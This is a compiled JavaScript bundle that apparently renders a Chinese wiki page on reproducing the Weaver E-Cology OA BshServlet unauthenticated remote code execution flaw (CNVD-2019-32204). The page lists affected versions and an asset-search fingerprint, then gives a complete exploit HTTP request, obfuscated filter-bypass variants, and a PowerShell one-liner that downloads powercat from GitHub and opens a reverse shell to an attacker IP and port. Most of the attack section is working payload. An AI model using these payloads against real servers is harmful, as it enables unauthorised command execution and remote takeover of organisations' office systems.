(window.webpackJsonp=window.webpackJsonp||[]).push([[467],{1544:function(t,s,a){t.exports=a.p+"assets/img/fanwei-6.6036fbd1.png"},2663:function(t,s,a){"use strict";a.r(s);var e=a(75),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"泛微oa-e-cology-bshservlet-远程代码执行漏洞-cnvd-2019-32204"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-cology-bshservlet-远程代码执行漏洞-cnvd-2019-32204"}},[t._v("#")]),t._v(" 泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.")]),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("app=“泛微-协同办公OA”")]),e("br"),t._v(" "),e("h2",{attrs:{id:"影响版本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[t._v("#")]),t._v(" 影响版本")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("E-cology 7.0")]),e("br"),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("E-cology 8.0")]),e("br"),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("E-cology 8.1")]),e("br"),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("E-cology 9.0")]),e("br"),t._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),e("p",[t._v("直接在网站根目录后加入组件访问路径 "),e("code",[t._v("/weaver/bsh.servlet.BshServlet/")]),t._v("，如下图在victim上执行了命令“whoami”")]),t._v(" "),e("p",[e("img",{attrs:{src:a(1544),alt:"img"}})]),t._v(" "),e("p",[t._v("请求包为")]),t._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[t._v("POST /weaver/bsh.servlet.BshServlet HTTP/1.1\nHost: xxxxxxxx:8088\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("compatible"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" MSIE "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("9.0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Windows NT "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("6.1")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Trident/5.0"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nConnection: close\nContent-Length: "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("98")]),t._v("\nContent-Type: application/x-www-form-urlencoded\n\nbsh.script"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("ex"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("u0065c"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"cmd /c dir"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("bsh.servlet.captureOutErr"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("true"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("bsh.servlet.output"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("raw\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br"),e("span",{staticClass:"line-number"},[t._v("5")]),e("br"),e("span",{staticClass:"line-number"},[t._v("6")]),e("br"),e("span",{staticClass:"line-number"},[t._v("7")]),e("br"),e("span",{staticClass:"line-number"},[t._v("8")]),e("br"),e("span",{staticClass:"line-number"},[t._v("9")]),e("br"),e("span",{staticClass:"line-number"},[t._v("10")]),e("br")])]),e("p",[t._v("关于绕过")]),t._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[t._v("eval%00"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ex"')]),t._v("%2b"),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ec('),e("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("whoami"),e("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(')"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nex"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("u0065c"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"cmd /c dir"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nIEX"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("New-Object System.Net.Webclient"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".DownloadString"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("powercat -c "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("ip")]),t._v(" -p "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("6666")]),t._v(" -e cmd\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br")])]),e("h2",{attrs:{id:""}},[e("a",{staticClass:"header-anchor",attrs:{href:"#"}},[t._v("#")])])],1)}),[],!1,null,null,null);s.default=n.exports}}]);